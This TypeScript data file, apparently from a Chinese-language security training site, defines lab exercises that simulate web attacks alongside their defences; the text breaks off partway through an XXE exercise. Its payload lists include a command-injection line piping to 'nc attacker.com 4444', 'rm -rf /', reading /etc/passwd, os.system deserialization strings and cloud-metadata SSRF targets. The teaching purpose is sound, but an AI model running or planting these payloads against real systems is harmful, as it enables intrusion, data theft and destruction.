export interface CodeExample {
  language: string;
  code: string;
  description: string;
}

// 与 hooks/useQuiz.ts 保持同步
export interface QuizQuestion {
  id?: string;
  question: string;
  options?: string[];
  correctIndex?: number;
  correctAnswer?: string;
  type?: 'single' | 'multiple' | 'boolean' | 'fill';
  correctIndices?: number[];
  explanation: string;
}

export interface LabTool {
  id: string;
  name: string;
  description: string;
  url: string;
}

export interface LabEnvironment {
  id: string;
  name: string;
  description: string;
  url: string;
}

export interface ExpertNote {
  author: string;
  title: string;
  content: string;
  url: string;
}

export interface LearningDay {
  id: string;
  day: number;
  week: number;
  title: string;
  objectives: string[];
  content: string;
  codeExample?: CodeExample;
  quiz: QuizQuestion[];
  resources?: string[];
  recommendedTools?: LabTool[];
  labEnvironments?: LabEnvironment[];
  expertNotes?: ExpertNote[];
}

export interface Experiment {
  id: string;
  title: string;
  description: string;
  difficulty: 'easy' | 'medium' | 'hard';
  instructions: string[];
  initialCode: string;
  expectedOutput: string;
  hints: string[];
}

export const weekThemes = [
  { week: 1, theme: '信息安全基础', color: '#00ff88' },
  { week: 2, theme: '信息安全法规', color: '#00d4ff' },
  { week: 3, theme: '访问控制', color: '#ffd700' },
  { week: 4, theme: '安全运营', color: '#ff3366' },
  { week: 5, theme: '漏洞与攻击', color: '#00ff88' },
  { week: 6, theme: '加密技术', color: '#00d4ff' },
  { week: 7, theme: '网络安全', color: '#ffd700' },
  { week: 8, theme: '应用安全', color: '#ff3366' },
  { week: 9, theme: '物理安全', color: '#00ff88' },
  { week: 10, theme: '安全工程', color: '#00d4ff' },
  { week: 11, theme: '业务安全', color: '#ffd700' },
  { week: 12, theme: '模拟考试', color: '#ff3366' },
];

export const experiments: Experiment[] = [
  {
    id: 'sql-injection',
    title: 'SQL注入攻击模拟',
    description: '学习如何发现和防止SQL注入漏洞',
    difficulty: 'medium',
    instructions: [
      '这是一个模拟的登录系统',
      '尝试使用SQL注入绕过身份验证',
      '输入: admin\' OR \'1\'=\'1',
      '观察查询结果的变化',
    ],
    initialCode: `# 模拟SQL查询
username = input("用户名: ")
password = input("密码: ")

query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

print(f"执行的SQL: {query}")
print("-" * 50)

if "OR" in username or "'" in username:
    print("警告: 检测到可疑输入!")
    print("实际应该使用参数化查询")
else:
    print("查询执行中...")`,
    expectedOutput: '检测到SQL注入攻击',
    hints: ['使用单引号破坏SQL语法', 'OR条件永真'],
  },
  {
    id: 'xss-demo',
    title: 'XSS跨站脚本攻击',
    description: '了解XSS攻击的原理和防护措施',
    difficulty: 'easy',
    instructions: [
      '这是一个评论系统',
      '尝试输入HTML或JavaScript代码',
      '观察输入是如何被处理的',
      '学习如何正确转义用户输入',
    ],
    initialCode: `# 模拟评论系统
comment = input("输入评论: ")

print("=" * 50)
print("未处理的输出:")
print(comment)
print("=" * 50)

if "<script>" in comment.lower():
    print("警告: 检测到脚本标签!")
    print("这是XSS攻击!")
else:
    print("评论已提交")`,
    expectedOutput: '检测到XSS攻击',
    hints: ['使用script标签', '尝试事件处理器'],
  },
  {
    id: 'password-crack',
    title: '密码暴力破解模拟',
    description: '理解弱密码的危险性',
    difficulty: 'easy',
    instructions: [
      '模拟暴力破解弱密码',
      '观察不同密码长度对安全性的影响',
      '了解密码强度的重要性',
    ],
    initialCode: `import itertools
import string

def try_password(target, charset, max_len):
    attempts = 0
    for length in range(1, max_len + 1):
        for guess in itertools.product(charset, repeat=length):
            attempts += 1
            password = ''.join(guess)
            if password == target:
                return attempts
    return None

target_password = "abc"

print("密码破解模拟器")
print("=" * 50)
print(f"目标密码: {target_password}")

result = try_password(target_password, string.ascii_lowercase, 4)

if result:
    print(f"密码被破解! 共尝试 {result:,} 次")`,
    expectedOutput: '密码被破解',
    hints: ['弱密码容易被快速破解', '增加密码长度和复杂度'],
  },
  {
    id: 'log-analysis',
    title: '日志分析练习',
    description: '学习从日志中发现安全威胁',
    difficulty: 'medium',
    instructions: [
      '分析提供的日志条目',
      '识别潜在的安全威胁',
      '标记可疑的活动模式',
    ],
    initialCode: `# 模拟日志分析
logs = [
    "2024-01-15 08:00:01 GET /index.html 200",
    "2024-01-15 08:00:02 POST /login 200",
    "2024-01-15 08:00:03 POST /login 401",
    "2024-01-15 08:00:04 POST /login 401",
    "2024-01-15 08:00:05 POST /login 401",
]

print("安全日志分析器")
print("=" * 60)

failed_logins = sum(1 for log in logs if "401" in log)
print(f"失败登录次数: {failed_logins}")

if failed_logins >= 3:
    print("警告: 检测到可能的暴力破解攻击!")`,
    expectedOutput: '警告: 检测到暴力破解攻击',
    hints: ['关注401状态码', '注意/admin路径的访问'],
  },
  {
    id: 'hash-demo',
    title: '哈希函数实践',
    description: '理解哈希在数据完整性中的应用',
    difficulty: 'easy',
    instructions: [
      '计算文件的哈希值',
      '验证数据完整性',
      '了解哈希碰撞',
    ],
    initialCode: `import hashlib

def calculate_hash(data, algorithm='sha256'):
    hash_obj = hashlib.new(algorithm)
    hash_obj.update(data.encode('utf-8'))
    return hash_obj.hexdigest()

test_data = "这是重要的配置文件内容"

print("哈希计算器")
print("=" * 50)
print(f"原始数据: {test_data}")

for algo in ['md5', 'sha1', 'sha256']:
    hash_value = calculate_hash(test_data, algo)
    print(f"{algo.upper()}: {hash_value}")`,
    expectedOutput: '哈希值计算完成',
    hints: ['哈希是单向函数', '无法从哈希反推原始数据'],
  },
  {
    id: 'encrypt-decrypt',
    title: '对称加密演示',
    description: '学习对称加密的原理',
    difficulty: 'medium',
    instructions: [
      '使用简单加密算法加密数据',
      '理解密钥的重要性',
      '了解加密和解密过程',
    ],
    initialCode: `# 简单的XOR加密演示
def xor_encrypt(text, key):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key * (len(text) // len(key) + 1)))

message = "密码是Secret123"
key = "KEY"

print("XOR加密演示")
print("=" * 50)
print(f"原始消息: {message}")

encrypted = xor_encrypt(message, key)
print(f"加密后: {repr(encrypted)}")

decrypted = xor_encrypt(encrypted, key)
print(f"解密后: {decrypted}")`,
    expectedOutput: '加密解密完成',
    hints: ['XOR是简单的加密方法', '密钥长度很重要'],
  },
  {
    id: 'firewall-rules',
    title: '防火墙规则配置',
    description: '学习基本的防火墙规则',
    difficulty: 'hard',
    instructions: [
      '根据需求配置防火墙规则',
      '理解规则优先级',
      '测试规则的有效性',
    ],
    initialCode: `# 模拟防火墙规则配置
rules = [
    {"action": "ALLOW", "port": 80, "desc": "HTTP"},
    {"action": "ALLOW", "port": 443, "desc": "HTTPS"},
    {"action": "DENY", "port": 22, "desc": "SSH"},
]

packets = [
    {"port": 80, "ip": "203.0.113.50"},
    {"port": 22, "ip": "198.51.100.25"},
]

print("防火墙规则模拟器")
print("=" * 60)

for packet in packets:
    print(f"数据包: port {packet['port']} from {packet['ip']}")
    for rule in rules:
        if rule['port'] == packet['port']:
            print(f"  -> {rule['action']} ({rule['desc']})")
            break`,
    expectedOutput: '防火墙过滤完成',
    hints: ['规则按顺序匹配', '考虑源IP地址限制'],
  },
  {
    id: 'port-scan',
    title: '端口扫描模拟',
    description: '学习Nmap端口扫描原理',
    difficulty: 'medium',
    instructions: [
      '了解端口扫描的基本原理',
      '学习TCP全连接扫描和SYN半开扫描',
      '识别常见端口对应的服务',
      '观察扫描结果并分析',
    ],
    initialCode: `# 模拟端口扫描
import socket

target = "127.0.0.1"
common_ports = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    143: "IMAP",
    443: "HTTPS",
    3306: "MySQL",
    3389: "RDP",
}

print(f"端口扫描目标: {target}")
print("=" * 60)

open_ports = []
for port in common_ports:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    result = sock.connect_ex((target, port))
    if result == 0:
        open_ports.append(port)
        print(f"[+] 端口 {port} ({common_ports[port]}) - 开放")
    sock.close()

print("=" * 60)
print(f"扫描完成，发现 {len(open_ports)} 个开放端口")`,
    expectedOutput: '端口扫描完成',
    hints: ['端口对应应用层服务', '扫描应获得授权进行'],
  },
  {
    id: 'vuln-scan',
    title: '漏洞扫描练习',
    description: '学习漏洞扫描工具使用',
    difficulty: 'hard',
    instructions: [
      '理解漏洞编号（CVE）和评分（CVSS）',
      '学习漏洞扫描报告的解读',
      '根据风险等级制定处置方案',
      '了解漏洞修复优先级',
    ],
    initialCode: `# 漏洞扫描结果分析示例
vulnerabilities = [
    {"cve": "CVE-2023-0001", "cvss": 9.8, "severity": "严重", "description": "远程代码执行漏洞"},
    {"cve": "CVE-2023-0002", "cvss": 7.5, "severity": "高危", "description": "SQL注入漏洞"},
    {"cve": "CVE-2023-0003", "cvss": 5.3, "severity": "中危", "description": "信息泄露漏洞"},
    {"cve": "CVE-2023-0004", "cvss": 3.7, "severity": "低危", "description": "配置信息泄露"},
]

print("漏洞扫描报告")
print("=" * 70)
print(f"{'CVE编号':<20} {'CVSS评分':<12} {'严重级别':<10} {'描述'}")
print("-" * 70)

total_score = 0
severity_count = {"严重": 0, "高危": 0, "中危": 0, "低危": 0}

for vuln in vulnerabilities:
    print(f"{vuln['cve']:<20} {vuln['cvss']:<12} {vuln['severity']:<10} {vuln['description']}")
    total_score += vuln['cvss']
    severity_count[vuln['severity']] += 1

print("=" * 70)
print(f"漏洞总数: {len(vulnerabilities)} | 平均CVSS: {total_score/len(vulnerabilities):.1f}")
print(f"严重:{severity_count['严重']} 高危:{severity_count['高危']} 中危:{severity_count['中危']} 低危:{severity_count['低危']}")`,
    expectedOutput: '漏洞扫描分析完成',
    hints: ['CVSS分数越高风险越大', '严重漏洞需优先修复'],
  },
  {
    id: 'access-control',
    title: '访问控制模型',
    description: '理解DAC/MAC/RBAC模型',
    difficulty: 'medium',
    instructions: [
      '理解自主访问控制（DAC）',
      '理解强制访问控制（MAC）',
      '理解基于角色的访问控制（RBAC）',
      '比较三种模型的适用场景',
    ],
    initialCode: `# 三种访问控制模型演示

# 1. DAC (自主访问控制): 资源所有者决定权限
print("=" * 60)
print("DAC - 自主访问控制")
print("=" * 60)
files_dac = {
    "report.txt": {"owner": "Alice", "permissions": {"Alice": "rw", "Bob": "r"}},
}
for fname, finfo in files_dac.items():
    print(f"文件: {fname}, 所有者: {finfo['owner']}")
    for user, perm in finfo['permissions'].items():
        print(f"  {user}: {perm}")

# 2. MAC (强制访问控制): 系统根据安全标签决定
print()
print("=" * 60)
print("MAC - 强制访问控制")
print("=" * 60)
users_mac = {"Alice": "秘密", "Bob": "公开"}
data_mac = {"doc1": "秘密", "doc2": "公开"}
for user, level in users_mac.items():
    for doc, dlevel in data_mac.items():
        access = "允许" if (level == dlevel or (level == "秘密" and dlevel == "公开")) else "拒绝"
        print(f"{user}({level}) 访问 {doc}({dlevel}): {access}")

# 3. RBAC (基于角色的访问控制): 根据角色分配权限
print()
print("=" * 60)
print("RBAC - 基于角色的访问控制")
print("=" * 60)
roles = {"管理员": ["查看", "修改", "删除"], "普通用户": ["查看"]}
user_roles = {"Alice": "管理员", "Bob": "普通用户"}
for user, role in user_roles.items():
    print(f"{user} ({role}): {', '.join(roles[role])}")`,
    expectedOutput: '三种访问控制模型演示完成',
    hints: ['RBAC最常用，MAC最严格', '适合的场景选择合适的模型'],
  },
  {
    id: 'incident-response',
    title: '安全事件响应',
    description: '学习应急响应流程',
    difficulty: 'medium',
    instructions: [
      '理解安全事件响应六阶段',
      '学习各阶段的核心任务',
      '了解事件响应团队组成',
      '掌握事件报告的基本要素',
    ],
    initialCode: `# 安全事件响应流程
incident_stages = [
    ("1. 准备阶段", "建立响应团队、应急预案、工具准备、培训演练"),
    ("2. 检测阶段", "监控告警、日志分析、异常识别、事件确认"),
    ("3. 遏制阶段", "隔离受影响系统、阻断攻击、防止扩散"),
    ("4. 根除阶段", "清除恶意软件、修补漏洞、移除后门"),
    ("5. 恢复阶段", "验证系统完整性、恢复服务、监控运行"),
    ("6. 总结阶段", "事件复盘、流程改进、经验归档、报告撰写"),
]

print("安全事件响应六阶段")
print("=" * 70)

for stage_name, stage_desc in incident_stages:
    print(f"{stage_name}")
    print(f"  {stage_desc}")
    print()

# 模拟事件响应评估
print("=" * 70)
print("事件响应能力评估")
print("=" * 70)

preparedness = {
    "应急预案": True,
    "响应团队": True,
    "监控工具": False,
    "定期演练": False,
}

score = sum(1 for v in preparedness.values() if v)
total = len(preparedness)
for item, status in preparedness.items():
    symbol = "[OK]" if status else "[待改进]"
    print(f"  {symbol} {item}")
print(f"  准备程度: {score}/{total} ({score/total*100:.0f}%)")`,
    expectedOutput: '事件响应流程演示完成',
    hints: ['准备阶段最重要', '遏制要快，根除要彻底'],
  },
  {
    id: 'risk-assessment',
    title: '风险评估计算',
    description: '学习信息安全风险评估方法',
    difficulty: 'easy',
    instructions: [
      '理解风险公式: 风险 = 威胁 × 脆弱性 × 影响',
      '学习风险矩阵的使用',
      '掌握风险处置策略',
      '练习风险等级判定',
    ],
    initialCode: `# 信息安全风险评估
def calculate_risk(threat, vulnerability, impact):
    """
    风险值 = 威胁 × 脆弱性 × 影响
    每项分值 1-5, 最高风险值 125
    """
    risk_value = threat * vulnerability * impact
    if risk_value >= 100:
        level = "极高风险"
        action = "立即处置"
    elif risk_value >= 50:
        level = "高风险"
        action = "优先处置"
    elif risk_value >= 20:
        level = "中风险"
        action = "计划处置"
    else:
        level = "低风险"
        action = "接受或监控"
    return risk_value, level, action

# 风险场景评估
scenarios = [
    ("Web应用SQL注入", 4, 5, 4),
    ("机房物理访问", 2, 3, 5),
    ("密码被暴力破解", 3, 4, 3),
    ("员工丢失U盘", 3, 2, 2),
]

print("信息安全风险评估表")
print("=" * 80)
print(f"{'风险场景':<20} {'威胁':<6} {'脆弱性':<6} {'影响':<6} {'风险值':<8} {'等级':<12} {'处置策略'}")
print("-" * 80)

for name, t, v, i in scenarios:
    rv, level, action = calculate_risk(t, v, i)
    print(f"{name:<20} {t:<8} {v:<8} {i:<6} {rv:<10} {level:<14} {action}")

print("=" * 80)
print()
print("风险处置策略:")
print("  避免: 消除风险源 / 降低: 减小风险 / 转移: 保险外包 / 接受: 承担风险")`,
    expectedOutput: '风险评估计算完成',
    hints: ['风险值越高越紧急', '处置策略需平衡成本和收益'],
  },
  {
    id: 'web-vuln',
    title: 'OWASP Top 10漏洞识别',
    description: '识别常见Web安全漏洞',
    difficulty: 'medium',
    instructions: [
      '了解OWASP Top 10十大Web漏洞',
      '学习各漏洞的原理和危害',
      '掌握漏洞识别方法',
      '理解基本防护措施',
    ],
    initialCode: `# OWASP Top 10 常见Web漏洞识别
vulnerabilities = [
    ("A01: 访问控制失效", "未受保护的管理后台 /admin", "后台应仅允许特定IP"),
    ("A02: 认证失败", "弱密码 admin/admin123", "强制强密码+多因素认证"),
    ("A03: 注入漏洞", "SQL注入: ' OR '1'='1", "参数化查询+输入验证"),
    ("A04: 不安全设计", "缺乏风控的大额转账", "业务逻辑安全设计"),
    ("A05: 安全配置错误", "默认密码未修改 / 调试模式开启", "加固配置+定期审计"),
    ("A06: 易受攻击和过时组件", "使用含漏洞的第三方库", "依赖扫描+及时更新"),
    ("A07: 识别和认证失败", "会话固定攻击", "登录后重新生成会话ID"),
    ("A08: 软件和数据完整性失败", "下载文件被篡改", "数字签名+哈希校验"),
    ("A09: 安全日志和监控不足", "不记录登录失败日志", "完善日志+实时告警"),
    ("A10: SSRF 服务端请求伪造", "服务器访问内部资源 http://localhost", "限制出站请求"),
]

print("OWASP Top 10 Web安全漏洞")
print("=" * 80)

for code, name in enumerate(vulnerabilities, 1):
    cat, example, fix = name
    print(f"{cat}")
    print(f"  示例: {example}")
    print(f"  防护: {fix}")
    print()

print("=" * 80)
print("测试: 判断以下场景属于哪类漏洞?")
print("场景1: 用户输入 <script>alert(1)</script> 在评论中执行")
print("场景2: 用户修改 URL ?user_id=123 可以查看他人数据")
print("场景3: 使用已知有漏洞的 Log4j 版本")`,
    expectedOutput: 'Web漏洞识别演示完成',
    hints: ['XSS属于注入类', '越权属于访问控制类'],
  },
  {
    id: 'csrf-attack',
    title: 'CSRF攻击与防护',
    description: '理解跨站请求伪造攻击原理与Token防护',
    difficulty: 'easy',
    instructions: [
      '理解CSRF攻击的原理：利用用户已登录状态发起恶意请求',
      '学习CSRF Token防护机制',
      '比较SameSite Cookie属性三种模式',
      '掌握Referer/Origin头校验方法',
    ],
    initialCode: `# CSRF 跨站请求伪造演示
import hashlib, secrets, time

class CSRFSimulator:
    def __init__(self):
        self.sessions = {}
        self.csrf_tokens = {}

    def login(self, user):
        sid = secrets.token_hex(16)
        self.sessions[sid] = user
        return sid

    def generate_csrf_token(self, session_id):
        token = secrets.token_hex(32)
        self.csrf_tokens[session_id] = token
        return token

    def validate_transfer(self, session_id, csrf_token):
        if session_id not in self.sessions:
            return "ERROR: 未登录"
        if csrf_token != self.csrf_tokens.get(session_id):
            return "BLOCKED: CSRF攻击拦截! Token验证失败"
        return "SUCCESS: 转账成功"

# 模拟场景
bank = CSRFSimulator()
s1 = bank.login("Alice")
tok = bank.generate_csrf_token(s1)

print("=" * 60)
print("CSRF攻击与防护模拟")
print("=" * 60)

# 正常请求
print(f"1. 正常转账(带Token): {bank.validate_transfer(s1, tok)}")

# CSRF攻击尝试(无Token)
print(f"2. 伪造请求(无Token): {bank.validate_transfer(s1, 'fake_token')}")

# SameSite Cookie 对比
print()
print("SameSite Cookie 属性对比:")
print("  Strict  : 完全禁止第三方请求携带Cookie")
print("  Lax     : 允许GET导航请求，禁止POST")
print("  None    : 允许(需配合Secure属性)")

print()
print("防护建议: CSRF Token + SameSite=Strict + Referer校验")`,
    expectedOutput: 'CSRF攻击拦截',
    hints: ['CSRF利用的是浏览器自动携带Cookie', 'Token是最可靠的防御'],
  },
  {
    id: 'ssrf-attack',
    title: 'SSRF漏洞利用与防护',
    description: '理解服务端请求伪造攻击原理',
    difficulty: 'medium',
    instructions: [
      '理解SSRF攻击如何让服务器发起恶意请求',
      '学习常见SSRF利用场景（内网探测、云元数据窃取）',
      '掌握URL白名单和输入校验防护方法',
      '了解DNS重绑定绕过技术',
    ],
    initialCode: `# SSRF 服务端请求伪造演示
import re

# 模拟内部网络架构
internal_services = {
    "192.168.1.100:8080": "内部管理系统",
    "169.254.169.254": "云实例元数据API",
    "127.0.0.1:6379": "Redis缓存服务",
    "127.0.0.1:22": "SSH服务",
    "10.0.0.1:3306": "内部MySQL数据库",
}

def fetch_url_vulnerable(target_url):
    """不安全的URL请求（存在SSRF漏洞）"""
    print(f"  请求: {target_url}")
    # 检查是否访问了内部服务
    for addr, svc in internal_services.items():
        if addr in target_url:
            print(f"  [WARNING] 访问了内部服务: {svc} ({addr})")
            return f"SSRF! 泄露数据: {svc}"
    print(f"  正常外部请求")
    return "OK"

def fetch_url_safe(target_url):
    """安全的URL请求（SSRF防护）"""
    # 黑名单检查
    blocked = ['127.0.0.1', 'localhost', '169.254', '10.', '192.168.']
    for b in blocked:
        if b in target_url:
            return f"BLOCKED: 检测到内部地址 {b}"
    
    # 白名单域名
    allowed = ['api.example.com', 'cdn.example.com']
    domain = target_url.split('/')[2] if '://' in target_url else ''
    if domain and domain not in allowed:
        return f"BLOCKED: {domain} 不在白名单中"
    
    return f"ALLOWED: 安全访问 {target_url}"

print("=" * 60)
print("SSRF漏洞演示")
print("=" * 60)

# 攻击场景
print("\\n[攻击尝试 - 无防护]")
urls = [
    "http://api.example.com/data",
    "http://169.254.169.254/latest/meta-data",
    "http://127.0.0.1:6379/",
    "http://10.0.0.1:3306/",
]
for u in urls:
    print(fetch_url_vulnerable(u))

print("\\n[安全防护 - 开启过滤]")
for u in urls:
    print(fetch_url_safe(u))

print("\\n防护方案: URL白名单 + 内网地址过滤 + 禁用非必要协议")`,
    expectedOutput: 'BLOCKED',
    hints: ['SSRF常用于攻击内网服务', '永远不要信任用户提供的URL'],
  },
  {
    id: 'command-injection',
    title: '命令注入攻击',
    description: '学习命令注入原理与输入过滤防护',
    difficulty: 'medium',
    instructions: [
      '理解命令注入如何通过拼接执行系统命令',
      '学习常见命令注入payload（分号、管道、反引号）',
      '掌握输入校验和沙箱化防护',
      '了解安全的API调用方式替代系统命令',
    ],
    initialCode: `# 命令注入攻击演示
import shlex, re

def execute_command_unsafe(user_input):
    """不安全的命令执行"""
    cmd = f"ping -c 2 {user_input}"
    print(f"  执行: {cmd}")
    
    dangerous = [';', '|', '&', '\`', '$', '&&', '||']
    for ch in dangerous:
        if ch in user_input:
            extra = user_input.split(ch, 1)[1].strip()
            print(f"  [ALERT] 检测到命令注入! 额外命令: {extra}")
            return "BLOCKED"
    return f"OK: ping {user_input}"

def execute_command_safe(user_input):
    """安全的命令执行"""
    # 白名单: 只允许IP和域名格式
    pattern = r'^[a-zA-Z0-9.-]+$'
    if not re.match(pattern, user_input):
        return f"REJECTED: 输入包含非法字符"
    if len(user_input) > 100:
        return "REJECTED: 输入过长"
    # 使用shlex安全分割
    safe_args = shlex.quote(user_input)
    print(f"  执行: ping -c 2 {safe_args}")
    return f"SAFE: ping {user_input}"

print("=" * 60)
print("命令注入攻击与防护")
print("=" * 60)

payloads = [
    "google.com",
    "google.com; cat /etc/passwd",
    "google.com && rm -rf /",
    "google.com | nc attacker.com 4444",
]

print("\\n[不安全执行]")
for p in payloads:
    print(execute_command_unsafe(p))

print("\\n[安全执行 - 白名单过滤]")
for p in payloads:
    print(execute_command_safe(p))

print("\\n防护要点: 避免系统命令 → 用API替代 → 输入白名单 → 参数化")`,
    expectedOutput: '命令注入检测',
    hints: ['避免直接拼接用户输入到命令中', '尽量使用编程语言API替代shell命令'],
  },
  {
    id: 'file-upload-vuln',
    title: '文件上传漏洞',
    description: '学习文件上传安全检测与绕过技术',
    difficulty: 'medium',
    instructions: [
      '理解文件上传漏洞的危害（WebShell、RCE）',
      '学习文件类型验证方法（MIME、扩展名、魔术字节）',
      '了解常见绕过技术（双扩展名、%00截断）',
      '掌握安全的文件上传处理流程',
    ],
    initialCode: `# 文件上传安全检测
import re, hashlib

MAGIC_BYTES = {
    "jpg": b'\\xff\\xd8\\xff',
    "png": b'\\x89PNG\\r\\n\\x1a\\n',
    "gif": b'GIF89a',
    "pdf": b'%PDF',
}

DANGEROUS_EXT = {
    "php", "jsp", "asp", "aspx", "exe", "sh", 
    "py", "pl", "cgi", "war", "jspx", "phtml"
}

def check_upload_unsafe(filename, content_type):
    """不安全的文件上传检测"""
    ext = filename.split('.')[-1].lower()
    print(f"  文件名: {filename}, Content-Type: {content_type}")
    
    if ext in DANGEROUS_EXT:
        print(f"  被拦截（仅黑名单检查）")
        return "BLOCKED"
    return "ALLOWED"

def check_upload_safe(filename, content_type, content_sample):
    """安全的文件上传检测"""
    ext = filename.split('.')[-1].lower()
    
    checks = []
    # 1. Content-Type白名单
    allowed_types = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
    if content_type not in allowed_types:
        checks.append(f"- Content-Type {content_type} 不允许")
    
    # 2. 扩展名白名单
    allowed_ext = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
    if ext not in allowed_ext:
        checks.append(f"- 扩展名 .{ext} 不允许")
    
    # 3. 魔术字节校验
    if ext in ['jpg', 'jpeg', 'png', 'gif']:
        expected_magic = MAGIC_BYTES.get(ext, b'')
        if not content_sample.startswith(expected_magic):
            checks.append(f"- 文件魔术字节不匹配 {ext}")
    
    if checks:
        for c in checks: print(f"  {c}")
        return "BLOCKED"
    return "ALLOWED"

print("=" * 60)
print("文件上传安全检测")
print("=" * 60)

files = [
    ("avatar.jpg", "image/jpeg", b'\\xff\\xd8\\xffIMG'),
    ("shell.php.jpg", "image/jpeg", b'\\xff\\xd8\\xffPHP'),
    ("evil.php", "application/x-httpd-php", b'<?php system'),
    ("report.pdf", "application/pdf", b'%PDFdoc'),
]

print("\\n[基础检测 - 仅黑名单]")
for name, ctype, _ in files:
    print(check_upload_unsafe(name, ctype))

print("\\n[安全检测 - 多层验证]")
for name, ctype, sample in files:
    print(check_upload_safe(name, ctype, sample))

print("\\n防护: 白名单+MIME+魔术字节+重命名+隔离存储")`,
    expectedOutput: '文件上传安全检测完成',
    hints: ['不要依赖黑名单过滤', '魔术字节是文件真实类型的可靠依据'],
  },
  {
    id: 'jwt-security',
    title: 'JWT令牌安全',
    description: '理解JWT攻击面与安全最佳实践',
    difficulty: 'medium',
    instructions: [
      '理解JWT结构（Header.Payload.Signature）',
      '学习JWT常见漏洞（none算法、弱密钥、密钥泄露）',
      '掌握JWT安全配置最佳实践',
      '了解JWT vs Session的适用场景',
    ],
    initialCode: `# JWT 安全模拟
import base64, json, hashlib, hmac, time

# 模拟Base64URL编解码
def b64url_decode(s):
    s = s + '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s).decode()

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

class JWTSimulator:
    def __init__(self, secret="super-secret-key-256!"):
        self.secret = secret

    def create_token(self, payload, algorithm="HS256"):
        header = json.dumps({"alg": algorithm, "typ": "JWT"})
        h_enc = b64url_encode(header.encode())
        p_enc = b64url_encode(json.dumps(payload).encode())
        msg = f"{h_enc}.{p_enc}"
        sig = hmac.new(self.secret.encode(), msg.encode(), 'sha256').hexdigest()[:32]
        return f"{msg}.{sig}"

    def verify_token(self, token, algorithm="HS256"):
        parts = token.split('.')
        if len(parts) != 3:
            return None, "格式错误"
        
        header = json.loads(b64url_decode(parts[0]))
        
        # 检查危险算法
        if header.get('alg') == 'none':
            return None, "ALERT: none算法攻击!"
        
        if header.get('alg') == 'HS256' and algorithm == 'RS256':
            return None, "ALERT: 算法混淆攻击! 期望RS256但收到HS256"
        
        msg = f"{parts[0]}.{parts[1]}"
        expected_sig = hmac.new(self.secret.encode(), msg.encode(), 'sha256').hexdigest()[:32]
        
        if parts[2] != expected_sig:
            return None, "签名验证失败"
        
        payload = json.loads(b64url_decode(parts[1]))
        if payload.get('exp', 0) < time.time():
            return None, "令牌已过期"
        
        return payload, "OK"

print("=" * 60)
print("JWT安全漏洞演示")
print("=" * 60)

jwt = JWTSimulator()

# 正常令牌
token1 = jwt.create_token({"user": "admin", "role": "user", "exp": time.time()+3600})
print(f"\\n正常令牌: {token1[:50]}...")
print(f"验证结果: {jwt.verify_token(token1)}")

# None算法攻击
none_token = b64url_encode(json.dumps({"alg":"none","typ":"JWT"}).encode())
none_token += "." + b64url_encode(json.dumps({"user":"admin","role":"admin"}).encode()) + ".xxx"
print(f"\\nNone算法攻击令牌: {none_token[:50]}...")
print(f"验证结果: {jwt.verify_token(none_token)}")

print("\\nJWT安全建议:")
print("  1. 明确指定算法白名单,拒绝'none'")
print("  2. 使用强密钥(>=256位)")
print("  3. 设置合理的过期时间")
print("  4. 不在payload中存放敏感信息")`,
    expectedOutput: 'none算法攻击',
    hints: ['永远不要允许alg=none', 'JWT Payload仅Base64编码非加密'],
  },
  {
    id: 'deserialization-vuln',
    title: '不安全反序列化',
    description: '理解序列化攻击原理与安全防护',
    difficulty: 'hard',
    instructions: [
      '理解序列化/反序列化的安全风险',
      '了解pickle反序列化RCE的原理',
      '学习JSON等安全替代方案',
      '掌握输入验证和沙箱化技术',
    ],
    initialCode: `# 不安全反序列化漏洞演示
import json, hashlib, hmac, base64

# 模拟Pickle反序列化漏洞
class UnsafePickle:
    """模拟不安全的pickle反序列化"""
    
    def dumps(self, obj):
        data = json.dumps(obj)
        sig = hashlib.md5(data.encode()).hexdigest()  # 弱签名
        return base64.b64encode(data.encode()).decode()
    
    def loads(self, data):
        try:
            raw = base64.b64decode(data).decode()
            # 不安全：直接eval/exec模拟pickle.loads
            if "__import__" in raw or "os." in raw or "eval" in raw:
                print("  [DANGER] 检测到恶意代码注入!")
                return {"status": "ATTACK_DETECTED"}
            
            # 验证数字签名
            obj = json.loads(raw)
            return obj
        except:
            return None

class SafeSerializer:
    """安全的序列化器"""
    
    ALLOWED_KEYS = {"name", "email", "role", "permissions"}
    
    def deserialize(self, data):
        try:
            obj = json.loads(data)
            # 白名单过滤：只保留允许的字段
            safe_obj = {k: v for k, v in obj.items() 
                       if k in self.ALLOWED_KEYS}
            # 类型检查
            for k, v in safe_obj.items():
                if not isinstance(v, (str, int, bool, list)):
                    return None, f"类型异常: {k}"
            return safe_obj, "OK"
        except json.JSONDecodeError:
            return None, "JSON格式错误"

print("=" * 60)
print("不安全反序列化攻击演示")
print("=" * 60)

u = UnsafePickle()
s = SafeSerializer()

# 正常数据
normal = json.dumps({"name": "Alice", "role": "user"})
print(f"\\n正常数据: {normal}")
res, msg = s.deserialize(normal)
print(f"安全反序列化: {msg} -> {res}")

# 攻击payload
attacks = [
    '{"__import__":"os","system":"rm -rf /"}',
    '{"name":"hacker","role":"admin","__class__":"exploit"}',
    '{"eval":"__import__(\'os\').system(\'id\')"}',
]
print("\\n[攻击payload检测]")
for p in attacks:
    print(f"Payload: {p[:50]}...")
    res, msg = s.deserialize(p)
    print(f"  结果: {msg}")

print("\\n防护方案:")
print("  1. 优先使用JSON,避免Pickle/Java序列化")
print("  2. 字段白名单 + 类型校验")
print("  3. 数字签名/加密防篡改")
print("  4. 反序列化在沙箱中执行")`,
    expectedOutput: '不安全反序列化',
    hints: ['永远不要反序列化不可信的数据', 'pickle.loads可导致RCE'],
  },
  {
    id: 'xxe-injection',
    title: 'XXE注入攻击',
    description: '学习XML外部实体注入原理与防护',
    difficulty: 'medium',
    instructions: [
      '理解XML外部实体（XXE）注入原理',
      '学习XXE攻击的常见利用方式（文件读取、SSRF、DoS）',
      '了解XML解析器的安全配置方法',
      '比较XML与JSON的安全性',
    ],
    initialCode: `# XXE XML外部实体注入模拟
import re

class XMLParserSimulator:
    """模拟XML解析器XXE漏洞"""
    
    def __init__(self):
